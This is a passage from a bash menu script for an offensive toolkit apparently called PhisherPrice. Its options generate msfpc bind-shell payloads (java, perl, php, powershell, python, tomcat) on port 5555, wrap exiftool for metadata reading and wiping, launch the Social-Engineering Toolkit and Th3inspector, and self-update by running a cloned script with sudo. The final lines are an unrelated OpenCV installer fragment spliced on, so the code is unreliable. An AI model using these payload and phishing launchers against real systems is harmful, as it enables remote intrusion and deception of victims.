msfpc java bind 5555 verbose

read

elif [ "$x" == "$cyouro9" ]; then                    #cyouro-Option-9
clear

msfpc perl bind 5555 verbose

read

elif [ "$x" == "$cyouro10" ]; then                    #cyouro-Option-10
clear

msfpc php bind 5555 verbose

read

elif [ "$x" == "$cyouro11" ]; then                    #cyouro-Option-11
clear

msfpc powershell bind 5555 verbose

read

elif [ "$x" == "$cyouro12" ]; then                    #cyouro-Option-12
clear

msfpc python bind 5555 verbose

read

elif [ "$x" == "$cyouro13" ]; then                    #cyouro-Option-13
clear

msfpc tomcat bind 5555 verbose

read

else 

n


fi

elif [ "$x" == "$option6" ]; then                          #Option6
clear
echo -e '\e[1;33m
///,        ////
\  /,      /  >.
 \  /,   _/  /.
  \_  /_/   /.
   \__/_   <    AutoExif Tool
   /<<< \_\_  PhisherPrice
  /,)^>>_._ \ Version 2.5 
  (/   \\ /\\\
       // //```
======((`((====\e[1;34m
'
 echo -e '\e[3;34m Created by "Sir Cryptic"                 
                   https://nullsec.online'
echo -e '\e[1;31m Exif Tool AutoMated For Easy Conveinience             
\e[3;34m
Created by "Sir Cryptic"
https://nullsec.online
\e[0m \e[1;31m
This Was Created For Educational Purposes Only

\e[3;39m
(e1) Read Image MetaData (Basic)
(e2) Read Image MetaData (Expert)
(e3) Read Imge MetaData (From Website)
(e4) Wipe Data From Image (Except JFIF Groups)
(e5) Wipe All GPS Data From Image
(e6) Wipe All MetaData From Image (Adds Comment Back In) 
(e7) Extract GPS from AVCH video 
(e8) Extract Info From Thumbnail
(e9) Wipe Photoshop MetaData
(i) Help

CTRL + C To Exit
'
autoexiftool1='e1'
autoexiftool2='e2'
autoexiftool3='e3'
autoexiftool4='e4'
autoexiftool5='e5'
autoexiftool6='e6'
autoexiftool7='e7'
autoexiftool8='e8'
autoexiftool9='e9'
help='i'



echo -e $Blue" ┌─["$red"PhisherPrice$Blue]──[$red~$Blue]─["$yellow"AutoExif$Blue]:"
echo -e $Blue" └─────► " ;read -p " CHOOSE: " x

if [ "$x" == "$autoexiftool1" ]; then                    #readmetadata basic
echo "enter image name followed by its file type eg: /home/username/Pictures/lulz.png"
read meta1
echo -e '

!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!!!!        Extracting Data        !!!!!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
'

exiftool $meta1

echo -e '

!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!!!! Data Extracted using AutoExif !!!!!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

Press ENTER To Go Back To The Main Menu
'

read


elif [ "$x" == "$autoexiftool2" ]; then                          #readmetadatadeep
echo "enter image name followed by its file type eg: /home/username/Pictures/lulz.png"
read mdeep
echo -e '

!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!!!!        Extracting Data        !!!!!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
'

cat $mdeep | exiftool -

echo -e '

!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!!!! Data Extracted using AutoExif !!!!!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

Press ENTER To Go Back To The Main Menu
'

read

elif [ "$x" == "$autoexiftool3" ]; then                          #webextract
echo "enter image location for eg: http://a.domain.com/bigfile.jpg"
read exifop1host
echo -e '

!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!!!!        Extracting Data        !!!!!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
'

curl -s $exifop1host | exiftool -fast -

echo -e '

!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!!!! Data Extracted using AutoExif !!!!!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

Press ENTER To Go Back To The Main Menu
'

read

elif [ "$x" == "$autoexiftool4" ]; then                          #autoexiftool4
echo "enter image name followed by its file type eg: /home/username/Pictures/lulz.png"
read exifop4
echo -e '

!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!!!!       Wiping JFIF Data        !!!!!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
'

exiftool -all= --jfif:all $exifop4

echo -e '

!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!!!!   Data Wiped Using AutoExif   !!!!!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

Press ENTER To Go Back To The Main Menu
'

read


elif [ "$x" == "$autoexiftool5" ]; then                          #AVCHextract
echo "enter image name followed by its file type eg: /home/username/Pictures/lulz.png"
read exifop5
echo -e '

!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!!!!        Wiping GPS Data        !!!!!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
'

exiftool -gps:all= $exifop5

echo -e '

!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!!!!   Data Wiped Using AutoExif   !!!!!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

Press ENTER To Go Back To The Main Menu
'

read

elif [ "$x" == "$autoexiftool6" ]; then                          #autoexiftool6
echo "enter image name followed by its file type eg: /home/username/Pictures/lulz.png"
read exifop6
echo -e '

!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!!!!        Replacing Data         !!!!!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
'

exiftool -all= -comment='Protected By NULLSecurity Team' $exifop6

echo -e '

!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!!!!! Data Replaced Using AutoExif !!!!!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

Press ENTER To Go Back To The Main Menu
'

read

elif [ "$x" == "$autoexiftool7" ]; then                          #autoexiftool7
echo "enter image name followed by its file type eg: /home/username/Videos/lulz.m2ts"
read avch
echo -e '

!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!        EXTRACTING PLEASE WAIT        !
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
 
'

exiftool -ee -p '$gpslatitude, $gpslongitude, $gpstimestamp' $avch

echo -e '

!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!!!! Data Extracted using AutoExif !!!!!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

Press ENTER To Go Back To The Main Menu
'

read



elif [ "$x" == "$autoexiftool8" ]; then                          #AVCHExtract
echo "enter image name followed by its file type eg: /home/username/pictures/lulz.png"
read exif8
echo -e '

!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!        EXTRACTING PLEASE WAIT        !
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
 
'

exiftool $exif8 -thumbnailimage -b | exiftool -

echo -e '

!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!!!! Data Extracted using AutoExif !!!!!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

Press ENTER To Go Back To The Main Menu
'

read


elif [ "$x" == "$autoexiftool9" ]; then                          #autoexiftool9

echo -e '
Delete Photoshop meta information from an image (note that the Photoshop informatio nalso includes IPTC).
enter image name followed by its file type eg: /home/username/pictures/lulz.jpg

'
read psd
echo -e '

!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!        EXTRACTING PLEASE WAIT        !
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
 
'

exiftool -Photoshop:All= $psd

echo -e '

!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!!!! Data Extracted using AutoExif !!!!!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

Press ENTER To Go Back To The Main Menu
'

read



elif [ "$x" == "$help" ]; then                          #autoexiftool10

clear
echo -e '\e[1;33m
\e[0m


 \e[1;31m
You can Put This Script In The Desired Folder You Like Where The Media
Is Located Then You can execute the script
when the script is in the media folder you want you can just type the
Image name Along with file type instead of typing the image location aswell
For eg: instead of /home/username/Pictures/lulz.png
I would just type : lulz.png


                          Press ENTER To Go Back To The Main Menu

'
read


else 

n


fi


elif [ "$x" == "$option7" ]; then                          #Option7
clear
echo -e '\e[1;33m
///,        ////
\  /,      /  >.
 \  /,   _/  /.
  \_  /_/   /.
   \__/_   <    PhisherPrice
   /<<< \_\_  Happy Hour Playset
  /,)^>>_._ \ Version 2.5 
  (/   \\ /\\\
       // //```
======((`((====\e[1;34m
'
 echo -e '\e[3;34m Created by "Sir Cryptic"                 
                   https://nullsec.online'
echo -e '\e[1;33m
  _________    ___________ ___________           .__   __   .__  __   
 /   _____/    \_   _____/ \__    ___/___   ____ |  | |  | _|__|/  |_ 
 \_____  \      |    __)_    |    | /  _ \ /  _ \|  | |  |/ /  \   __\
 /        \     |        \   |    |(  <_> |  <_> )  |_|    <|  ||  |  
/_______  / /\ /_______  /   |____| \____/ \____/|____/__|_ \__||__|  
        \/  \/         \/                                  \/       \e[1;34m
'  
echo "Are You Sure You Want To Start SE Toolkit?"
echo "Press ENTER For Yes Press Any Other Option For No."
read pi9host
clear
echo -e '
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
! Starting Social Engineering Toolkit  !
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
 
'

$pi9host sudo setoolkit

elif [ "$x" == "$option8" ]; then                          #Option9
clear
echo -e '
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!   Please Wait Loading Th3inspector   !
!  To Exit Th3inspector Press ENTER    !
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! 
'
Th3inspector

elif [ "$x" == "$update" ]; then                 #Update
echo "This Script is Only Intended for Kali Linux And Similar OS"

git clone https://github.com/NULL-Security-Team/phisherprice
cd phisherprice && sudo bash ./update.sh
sudo phisherprice

elif [ "$x" == "$contact" ]; then                 #CONTACTME                    

clear

echo -e '\e[1;33m
\e[0m
 \e[1;31m

 If You Have Any Issues Then Feel Free 
 To Contact Me (Sir Cryptic) Either Via:

 FORUMS,DISCORD,EMAIL
 
 no-reply@nullsec.online
 https://nullsec.online
'
echo -e '\e[1;34m
I Would Personally Like To Thank \e[1;33mJack \e[1;34m Over @ \e[1;32m Kali Hacking Community Discord Server\e[1;34m
For Being My Motivation To Keep Making This Tool, You Can Join Using The Link Below.

https://discord.com/invite/aTbExhe

I Would Also Like To Thank \e[1;35mKiera<3 \e[1;34m over @KCH For Making Me Aware Of Bugs
Without People Like This I Probably Would Have Been Oblivious. 

So Thankyou Once Again To All Those That Made This Possible & Gave Me Inspiration. 

- Sir Cryptic

                          Press ENTER To Go Back To The Main Menu
'
read


else 

n


fi

done

	exit 1
	fi
	if [[ -z "$dldir" ]]; then
		dldir=OpenCV
	fi
	if ! sudo true; then
		exit 1
	fi
	set -e
